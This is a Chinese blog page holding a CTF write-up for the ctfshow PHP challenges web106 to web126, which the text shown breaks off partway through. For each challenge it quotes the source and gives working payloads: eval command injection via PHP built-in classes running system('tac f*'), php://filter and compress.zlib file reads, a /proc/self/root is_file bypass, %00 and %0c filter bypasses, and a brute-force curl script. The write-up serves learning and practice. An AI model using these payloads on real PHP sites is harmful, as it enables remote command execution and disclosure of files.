<!DOCTYPE html>
<html data-theme="">
<head>
    <!-- ! 引用文件位置-->
    <!--引用文件位置-->
<meta charset="utf-8">
<title>原神，启动！！</title>
<!--    daisyui cdn-->
<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
<!--     tailwindcss cdn daisyui 前置-->
<script src="https://cdn.tailwindcss.com"></script>
<!--    更改主题颜色-->
<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
<!--自动排版-->
<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
<!--    谷歌字体库镜像-->
<style>
    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
</style>
<!--jquery-->
<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
<!--    fancybox-->
<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
<!--highlight 代码高亮 使用hexo的不会高亮-->
<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
<script>
    hljs.highlightAll();
</script>
<link rel="stylesheet"
      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
<!--LeanCLoud-->
<script src="https://cdn.jsdelivr.net/npm/leancloud-storage@4.15.2/dist/av.min.js"></script>
<!--卜算子busuanzi-->
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!--    自定义css-->

<link rel="stylesheet" href="/css/output.css">


<link rel="stylesheet" href="/css/style.css">

<!--    自定义js-->

<script src="/js/view.js"></script>


<script src="/js/fancybox.js"></script>


<script src="/js/search.js"></script>

<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
<meta name="referrer" content="no-referrer"/>
<meta name="generator" content="Hexo 7.0.0"></head>
<body>
<!--导航栏-->
<div class="fixed z-10 w-full">
    <div class="container-nav justify-center flex">
        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
            <div class="flex-1">
                <a class="btn btn-ghost text-xl" href="/">Natro92&#39;s Site</a>
            </div>
            <div class="flex-none gap-2">
                <ul class="menu menu-horizontal px-1">
                    
                    
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/">首页</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/blogs">归档</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/tags">标签</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/categories">分类</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/link">更多</a></li>
                        
                    
                    <!--<li><a href="/">Home</a></li>-->
                    <!--<li><a href="/blogs">Archive</a></li>-->
                    <!--<li><a href="/about/">About</a></li>-->
                    <li>
                        <details class="dropdown">
                            <summary>
                                更换主题
                            </summary>
                            <ul tabindex="0"
                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
                                <!--主题选择配置，主题来自daisyui-->

<li><a data-set-theme="light">Light</a></li>
<li><a data-set-theme="dark">Night</a></li>
<li><a data-set-theme="cupcake">Cupcake</a></li>
<li><a data-set-theme="bumblebee">Bumblebee</a></li>
<li><a data-set-theme="emerald">Emerald</a></li>
<li><a data-set-theme="coporate">Corporate</a></li>
<li><a data-set-theme="synthwave">Synthwave</a></li>
<li><a data-set-theme="retro">Retro</a></li>
<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
<li><a data-set-theme="halloween">Halloween</a></li>
<li><a data-set-theme="garden">Garden</a></li>
<li><a data-set-theme="forest">Forest</a></li>
<li><a data-set-theme="aqua">Aqua</a></li>
<li><a data-set-theme="lofi">Lo-fi</a></li>
<li><a data-set-theme="pastel">Pastel</a></li>
<li><a data-set-theme="fantasy">Fantasy</a></li>
<li><a data-set-theme="wireframe">Wireframe</a></li>
<li><a data-set-theme="black">Black</a></li>
<li><a data-set-theme="luxury">Luxury</a></li>
<li><a data-set-theme="dracula">Dracula</a></li>
<li><a data-set-theme="cmyk">CMYK</a></li>
<li><a data-set-theme="autumn">Autumn</a></li>
<li><a data-set-theme="business">Business</a></li>
<li><a data-set-theme="acid">Acid</a></li>
<li><a data-set-theme="lemonade">Lemonade</a></li>
<li><a data-set-theme="night">Night</a></li>
<li><a data-set-theme="coffee">Coffee</a></li>
<li><a data-set-theme="winter">Winter</a></li>
<li><a data-set-theme="dim">Dim</a></li>
<li><a data-set-theme="nord">Nord</a></li>
<li><a data-set-theme="sunset">Sunset</a></li>
                            </ul>
                        </details>
                    </li>
                </ul>
                <div class="form-control">

                    <input type="text" placeholder="Search is not yet!" id="local-search-input"
                           class="st-search-input input input-bordered w-24 md:w-auto rounded-xl"/>
                    <div id="local-search-result" class="local-search-result-cls rounded-xl"></div>
                    <script type="text/javascript" id="local.search.active">
                        var inputArea = document.querySelector("#local-search-input");
                        inputArea.onclick = function () {
                            getSearchFile();
                            this.onclick = null
                        }
                        inputArea.onkeydown = function () {
                            if (event.keyCode === 13) return false
                        }
                    </script>
                </div>
                <div class="dropdown dropdown-end">
                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
                        <div class="w-10 rounded-full">
                            <a target="_blank" rel="noopener" href="https://github.com/natro92">
                                <img alt="Tailwind CSS Navbar component"
                                     src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706006117478-a75e82ba-dea0-46bd-be3b-fa82cb80209c.png"/>
                            </a>
                        </div>
                    </div>
                    <!--TODO 完成这里-->
                    <!--<ul tabindex="0"-->
                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
                    <!--    <li>-->
                    <!--        <a class="justify-between">-->
                    <!--            Profile-->
                    <!--            <span class="badge">New</span>-->
                    <!--        </a>-->
                    <!--    </li>-->
                    <!--    <li><a>Settings</a></li>-->
                    <!--    <li><a>Logout</a></li>-->
                    <!--</ul>-->
                </div>
            </div>
        </div>
    </div>
</div>
<!--导航栏结束-->
<div class="fleet">
    <!--    嵌套位置-->
    <!-- 博客详情 -->


<!--Post开始-->
<div class="fleet container-nav justify-center flex mb-16 w-full">
    <div class="w-8/12 justify-center flex">
        <div class="fleet-body flex-col w-full">
            <div class="fleet-header">
                <div class="fleet-content-header-title text-6xl">
                    <h1 class="inline-block font-extrabold mt-16 mb-8">web106-web131php特性篇（二）</h1>
                </div>
                <div class="fleet-content-header-info">
                    <span>2023/07/09 19:35:16</span>
                </div>
            </div>
            <div class="divider w-full"></div>
            <div class="fleet-content mt-8">
                <div class="fleet-content-body">
                    <div class="fleet-content-body-content justify-center flex w-full">
                        
                        <!--代码块-->
                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
                        
                        <!--图片-->
                        
                        <article class="prose">
                            <h1 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
include(&quot;flag.php&quot;);

if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
  $v1 &#x3D; $_POST[&#39;v1&#39;];
  $v2 &#x3D; $_GET[&#39;v2&#39;];
  if(sha1($v1)&#x3D;&#x3D;sha1($v2) &amp;&amp; $v1!&#x3D;$v2)&#123;
    echo $flag;
  &#125;
&#125;</code></pre>
<p>数组和转为0e都行，这里图省事使用了数组绕过。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684334208070-bcca58a3-83a4-4cb2-a742-02362c1d614a.png" alt="image.png"></p>
<h1 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107 parse_str"></a>web107 parse_str</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

if(isset($_POST[&#39;v1&#39;]))&#123;
  $v1 &#x3D; $_POST[&#39;v1&#39;];
  $v3 &#x3D; $_GET[&#39;v3&#39;];
  parse_str($v1,$v2);
  if($v2[&#39;flag&#39;]&#x3D;&#x3D;md5($v3))&#123;
    echo $flag;
  &#125;

&#125;</code></pre>
<p><code>parse_str</code>函数会存储值作为变量<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684334510177-e84f6494-6118-48b2-8afe-2446165f306e.png" alt="image.png"><br>因此题目的意思是将v1中flag值与v3中的MD5值相同，那么：<br>GET：<code>?v3=hello</code><br>POST：<code>v1=flag=5d41402abc4b2a76b9719d911017c592</code></p>
<h1 id="web108-ereg-null绕过和intval"><a href="#web108-ereg-null绕过和intval" class="headerlink" title="web108 ereg null绕过和intval"></a>web108 ereg null绕过和intval</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])&#x3D;&#x3D;&#x3D;FALSE)  &#123;
    die(&#39;error&#39;);

&#125;
&#x2F;&#x2F;只有36d的人才能看到flag
if(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123;
    echo $flag;
&#125;</code></pre>
<p><code>ereg</code>匹配函数，题目意思为c中只能出现字符，函数在NULL截断漏洞，%00截断绕过<br><code>strrev</code>反转字符串<br>0x36d对应的数值为877，需要反转一次变为778。<br>组合起来payload：<code>a%00778</code></p>
<h1 id="web109-异常处理类命令执行"><a href="#web109-异常处理类命令执行" class="headerlink" title="web109 异常处理类命令执行"></a>web109 异常处理类命令执行</h1><blockquote>
<p>异常处理类：<a target="_blank" rel="noopener" href="http://c.biancheng.net/view/6253.html">h<del>ttp:&#x2F;&#x2F;c.biancheng.net&#x2F;view&#x2F;6253.html</del></a></p>
</blockquote>
<pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
    $v1 &#x3D; $_GET[&#39;v1&#39;];
    $v2 &#x3D; $_GET[&#39;v2&#39;];

    if(preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v1) &amp;&amp; preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v2))&#123;
            eval(&quot;echo new $v1($v2());&quot;);
    &#125;

&#125;</code></pre>
<p>直接构造反射类（并没有想到，反射类还是没有太弄懂）<br><code>?v1=ReflectionClass&amp;v2=system(&quot;tac f*&quot;)</code><br>也可以用exception类，详情见题目下方链接。<br>Exception 异常处理类  payload: <code>?v1=Exception&amp;v2=system(&#39;cat fl36dg.txt&#39;)</code><br>同理：<code>?v1=mysqli&amp;v2=system(&#39;tac fl36dg.txt&#39;)</code><br>这些都是因为类的tostring魔术方法导致的执行。<br>也就是初始化一个mysqli类，但是实际上这个类的初始化时候传参不止这一个，所以是初始化失败的，但是由于其内部有魔术方法__toString：<br>如果类定义了toString方法，就能在测试时，echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。<br>这时候就可以echo出来了。<br>同样内部类Exception也是可以的，这个类会把传入的参数输出出来，也是由__toString方法。</p>
<h2 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h2><p>反射类详情见web100方法二</p>
<h1 id="web110-php内置类-利用-FilesystemIterator-获取指定目录下的所有文件"><a href="#web110-php内置类-利用-FilesystemIterator-获取指定目录下的所有文件" class="headerlink" title="web110 php内置类 利用 FilesystemIterator 获取指定目录下的所有文件"></a>web110 php内置类 利用 FilesystemIterator 获取指定目录下的所有文件</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.filesystemiterator.php">https://www.php.net/manual/zh/class.filesystemiterator.php</a></p>
</blockquote>
<pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
    $v1 &#x3D; $_GET[&#39;v1&#39;];
    $v2 &#x3D; $_GET[&#39;v2&#39;];

    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v1))&#123;
            die(&quot;error v1&quot;);
    &#125;
    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v2))&#123;
            die(&quot;error v2&quot;);
    &#125;

    eval(&quot;echo new $v1($v2());&quot;);

&#125;</code></pre>
<p>利用 FilesystemIterator 获取指定目录下的所有文件 <a target="_blank" rel="noopener" href="http://phpff.com/filesystemiterator">http://phpff.com/filesystemiterator</a> <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.filesystemiterator.php">https://www.php.net/manual/zh/class.filesystemiterator.php</a> getcwd()函数 获取当前工作目录 返回当前工作目录<br>payload：<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p>
<h1 id="web111-引用变量和-GLOBALS-指针相关"><a href="#web111-引用变量和-GLOBALS-指针相关" class="headerlink" title="web111 引用变量和$GLOBALS 指针相关"></a>web111 引用变量和$GLOBALS 指针相关</h1><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);
error_reporting(0);
include(&quot;flag.php&quot;);

function getFlag(&amp;$v1,&amp;$v2)&#123;
    eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);
    var_dump($$v1);
&#125;


if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
    $v1 &#x3D; $_GET[&#39;v1&#39;];
    $v2 &#x3D; $_GET[&#39;v2&#39;];

    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v1))&#123;
            die(&quot;error v1&quot;);
    &#125;
    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v2))&#123;
            die(&quot;error v2&quot;);
    &#125;
    
    if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $v1))&#123;
            getFlag($v1,$v2);
    &#125;</code></pre>
<p>想要执行getflag函数，那么v1必须为<code>ctfshow</code>，v2赋值为<code>GLOBALS</code>，这里运用到了全局变量。<br>然后再将v2的值赋给v1，再接着getFlag函数，打印v1，v1为全局变量的时候，即可打印出flag<br>实在没看懂，我们看看以下解释：<br>假设现在有以下两个变量：</p>
<pre class="language-php" data-language="php"><code class="language-php">$v1 &#x3D; &#39;foo&#39;;  &#x2F;&#x2F; $v1 的值为字符串 &#39;foo&#39;
$v2 &#x3D; &#39;bar&#39;;  &#x2F;&#x2F; $v2 的值为字符串 &#39;bar&#39;
$bar &#x3D; &#39;i am bar&#39;;</code></pre>
<p>现在调用 <code>getFlag</code> 函数，并将 <code>$v1</code> 和 <code>$v2</code> 作为引用参数传递给它：</p>
<pre class="language-php" data-language="php"><code class="language-php">getFlag($v1, $v2);</code></pre>
<p>在函数内部，<code>&quot;$$v1 = &amp;$$v2;&quot;</code> 这一行代码将把 <code>$v2</code> 的引用赋值给了以 <code>$v1</code> 变量的值 <code>&#39;foo&#39;</code> 作为变量名的新变量。也就是说，在函数执行完毕后，我们得到了另一个变量 <code>$foo</code>，它指向了和 <code>$bar</code> 相同的内存地址。<br>因此，如果我们在调用 <code>getFlag</code> 函数之后输出 <code>$foo</code> 变量的值，应该会得到 <code>$bar</code>的值：</p>
<pre class="language-php" data-language="php"><code class="language-php">var_dump($foo);  &#x2F;&#x2F; 输出 string(8) &quot;i am bar&quot;</code></pre>
<p>测试如下：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684337748600-cf869928-8df9-4731-ac96-582deef8fea3.png" alt="image.png"><br>PS：byd我最开始还让gpt忽悠了，后来反应过来了，改回来了。再提醒一下，不要忘记编程语言的基础，<code>=</code>是赋值，不是取等！</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
function getFlag(&amp;$v1,&amp;$v2)&#123;
    eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;);
    var_dump($$v1);
&#125;

$v1 &#x3D; &#39;a&#39;;
$v2 &#x3D; &#39;GLOBALS&#39;;
$$v1 &#x3D; &amp;$$v2;
getFlag($v1,$v2);
?&gt;</code></pre>
<p>和指针类似，稍微理一下，也就是$a给予了和$GLOBALS相同的超全局变量。最后vardump的是$a。</p>
<h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>global和$GLOBALS：<a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-369541.html">https://www.php.cn/php-weizijiaocheng-369541.html</a></p>
<h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><h3 id="考点：php伪协议绕过is-file-highlight-file-对于php伪协议的使用"><a href="#考点：php伪协议绕过is-file-highlight-file-对于php伪协议的使用" class="headerlink" title="考点：php伪协议绕过is_file+highlight_file  对于php伪协议的使用"></a>考点：php伪协议绕过is_file+highlight_file  对于php伪协议的使用</h3><pre class="language-python" data-language="python"><code class="language-python">highlight_file(__FILE__);
error_reporting(0);
function filter($file)&#123;
    if(preg_match(&#39;&#x2F;\.\.\&#x2F;|http|https|data|input|rot13|base64|string&#x2F;i&#39;,$file))&#123;
        die(&quot;hacker!&quot;);
    &#125;else&#123;
        return $file;
    &#125;
&#125;
$file&#x3D;$_GET[&#39;file&#39;];
if(! is_file($file))&#123;
    highlight_file(filter($file));
&#125;else&#123;
    echo &quot;hacker!&quot;;
&#125;</code></pre>
<p>可以直接读文件<code>?file=php://filter/resource=flag.php</code><br>除此之外，还有几种特殊的编码方式<br><code>file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</code>（这个之前没见过，注意一下）<br><code>file=compress.zlib://flag.php</code><br><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</code></p>
<h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/meng-han/p/16803560.html#:~:text=ctfshow%20web112%20%28%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87is_file%E5%87%BD%E6%95%B0%29%20%24file%20%3D%20%24_GET%20%5B%20%27file%27,%7D%20else%20%7B%20echo%20%22hacker%21%22%20%3B%20%7D%20%E8%BF%99%E9%87%8C%E7%9A%84is_file%E5%87%BD%E6%95%B0%EF%BC%8C%E5%9C%A8%E4%BD%BF%E7%94%A8php%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%97%B6%E5%80%99%E4%BC%9A%E8%BF%94%E5%9B%9Efalse%EF%BC%8C%E9%99%A4%E4%BA%86file%3A%2F%2F%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%A4%96%E3%80%82">https://www.cnblogs.com/meng-han/p/16803560.html#:~:text&#x3D;ctfshow%20web112%20%28%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87is_file%E5%87%BD%E6%95%B0%29%20%24file%20%3D%20%24_GET%20%5B%20%27file%27,%7D%20else%20%7B%20echo%20%22hacker%21%22%20%3B%20%7D%20%E8%BF%99%E9%87%8C%E7%9A%84is_file%E5%87%BD%E6%95%B0%EF%BC%8C%E5%9C%A8%E4%BD%BF%E7%94%A8php%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%97%B6%E5%80%99%E4%BC%9A%E8%BF%94%E5%9B%9Efalse%EF%BC%8C%E9%99%A4%E4%BA%86file%3A%2F%2F%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%A4%96%E3%80%82</a></p>
</blockquote>
<h3 id="考点：目录溢出"><a href="#考点：目录溢出" class="headerlink" title="考点：目录溢出"></a>考点：目录溢出</h3><pre class="language-python" data-language="python"><code class="language-python">highlight_file(__FILE__);
error_reporting(0);
function filter($file)&#123;
    if(preg_match(&#39;&#x2F;filter|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;
        die(&#39;hacker!&#39;);
    &#125;else&#123;
        return $file;
    &#125;
&#125;
$file&#x3D;$_GET[&#39;file&#39;];
if(! is_file($file))&#123;
    highlight_file(filter($file));
&#125;else&#123;
    echo &quot;hacker!&quot;;
&#125;</code></pre>
<p><code>?file=compress.zlib://flag.php</code><br>除此之外，有个预期解：<code>?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code><br>在linux中&#x2F;proc&#x2F;self&#x2F;root是指向根目录的，也就是如果在命令行中输入ls &#x2F;proc&#x2F;self&#x2F;root，其实显示的内容是根目录下的内容。<br>原理：is_file函数能处理的长度有限,用&#x2F;proc&#x2F;self&#x2F;root可以目录溢出</p>
<h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><pre class="language-python" data-language="python"><code class="language-python">error_reporting(0);
highlight_file(__FILE__);
function filter($file)&#123;
    if(preg_match(&#39;&#x2F;compress|root|zip|convert|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;
        die(&#39;hacker!&#39;);
    &#125;else&#123;
        return $file;
    &#125;
&#125;
$file&#x3D;$_GET[&#39;file&#39;];
echo &quot;师傅们居然tql都是非预期 哼！&quot;;
if(! is_file($file))&#123;
    highlight_file(filter($file));
&#125;else&#123;
    echo &quot;hacker!&quot;;</code></pre>
<p>这个直接使用<code>?file=php://filter/resource=flag.php</code>就行</p>
<h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><h3 id="考点：trim函数的绕过-is-numeric绕过"><a href="#考点：trim函数的绕过-is-numeric绕过" class="headerlink" title="考点：trim函数的绕过+is_numeric绕过"></a>考点：trim函数的绕过+is_numeric绕过</h3><pre class="language-python" data-language="python"><code class="language-python">include(&#39;flag.php&#39;);
highlight_file(__FILE__);
error_reporting(0);
function filter($num)&#123;
    $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num);
    $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num);
    $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num);
    $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num);
    $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num);
    return $num;
&#125;
$num&#x3D;$_GET[&#39;num&#39;];
if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123;
    if($num&#x3D;&#x3D;&#39;36&#39;)&#123;
        echo $flag;
    &#125;else&#123;
        echo &quot;hacker!!&quot;;
    &#125;
&#125;else&#123;
    echo &quot;hacker!!!&quot;;
&#125;</code></pre>
<h3 id="trim函数"><a href="#trim函数" class="headerlink" title="trim函数"></a>trim函数</h3><pre class="language-python" data-language="python"><code class="language-python">语法
trim(string,charlist)

参数	        描述
string	        必需。规定要检查的字符串。
charlist	    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：

&quot;\0&quot;       - NULL
&quot;\t&quot;       - 制表符
&quot;\n&quot;       - 换行
&quot;\x0B&quot;     - 垂直制表符
&quot;\r&quot;       - 回车
&quot; &quot;        - 空格</code></pre>
<p>测试程序：</p>
<pre class="language-python" data-language="python"><code class="language-python">&lt;?php
for ($i&#x3D;0; $i &lt;&#x3D;128 ; $i++) &#123;
$x&#x3D;chr($i).&#39;1&#39;;
if(trim($x)!&#x3D;&#x3D;&#39;1&#39; &amp;&amp;  is_numeric($x))&#123;
echo urlencode(chr($i)).&quot;\n&quot;;
&#125;
&#125;</code></pre>
<p>发现除了+-.号以外还有只剩下%0c也就是换页符了，所以这个题只有这一个固定的解了。<br><code>num=%0c36</code></p>
<h1 id="web123、web125、web126"><a href="#web123、web125、web126" class="headerlink" title="*web123、web125、web126"></a>*web123、web125、web126</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p>
</blockquote>
<h3 id="考点：php变量不允许出现-传入-代替-SERVER-‘argv’"><a href="#考点：php变量不允许出现-传入-代替-SERVER-‘argv’" class="headerlink" title="考点：php变量不允许出现. 传入[代替_ $_SERVER[‘argv’]"></a>考点：php变量不允许出现. 传入[代替_ $_SERVER[‘argv’]</h3><pre class="language-python" data-language="python"><code class="language-python">error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
$a&#x3D;$_SERVER[&#39;argv&#39;];
$c&#x3D;$_POST[&#39;fun&#39;];
if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;
    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?&#x2F;&quot;, $c)&amp;&amp;$c&lt;&#x3D;18)&#123;
         eval(&quot;$c&quot;.&quot;;&quot;);  
         if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;
             echo $flag;
         &#125;
    &#125;
&#125;
?&gt;</code></pre>
<p>第一个问题是php变量名是不允许点的使用的：<br>比如可以测试一下：</p>
<pre class="language-python" data-language="python"><code class="language-python">&lt;?php
var_dump($_POST);

输入 CTF_SHOW.COM&#x3D;1
返回
array(1) &#123; [&quot;CTF_SHOW_COM&quot;]&#x3D;&gt; string(1) &quot;1&quot; &#125;
</code></pre>
<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688182650580-e505632b-147a-4bc7-8dbd-d8b01aa593fd.png" alt="image.png"><br>另外有一个知识点，使用<code>[</code>来代替下划线，具体原因未知，爆破脚本如下：</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
  function curl($url,$data)&#123;
  $ch &#x3D; curl_init(); 
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
$response &#x3D; curl_exec($ch);
curl_close($ch);
return strlen($response);
&#125;
$url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&quot;;
for ($i&#x3D;0; $i &lt;&#x3D;128 ; $i++) &#123; 
  for ($j&#x3D;0; $j &lt;&#x3D;128 ; $j++) &#123;
    $data&#x3D;&quot;CTF&quot;.urlencode(chr($i)).&quot;SHOW&quot;.urlencode(chr($j)).&quot;COM&quot;.&quot;&#x3D;123&quot;;
    if(curl($url,$data)!&#x3D;0)&#123;
      echo $data.&quot;\n&quot;; 
    &#125;
  &#125;
&#125;
</code></pre>
<p>test.php:</p>
<pre class="language-python" data-language="python"><code class="language-python">&lt;?php
if(isset($_POST[&#39;CTF_SHOW.COM&#39;]))&#123;
    echo 123;
&#125;
</code></pre>
<p>输出结果<br><code>CTF%5BSHOW.COM=123</code><br>另外</p>
<pre class="language-python" data-language="python"><code class="language-python">1、cli模式（命令行）下

